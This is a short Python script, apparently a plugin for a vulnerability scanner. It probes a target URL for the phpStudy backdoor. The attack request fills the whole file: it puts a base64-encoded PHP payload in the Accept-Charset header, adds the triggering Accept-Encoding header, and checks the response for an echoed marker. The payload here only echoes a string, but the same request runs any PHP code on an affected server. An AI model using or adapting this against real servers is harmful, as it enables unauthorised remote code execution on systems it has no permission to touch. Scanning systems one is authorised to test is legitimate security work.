#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

import base64

url=sys.argv[1]
payload =b'echo "wfcwfc";'
bug ="wfcwfc"
info ="phpstudy后门"


def main():
    res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"+'\r\n'+"Accept-Charset: "+base64.b64encode(payload).decode()+'\r\n'+"Accept-Encoding: gzip,deflate");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
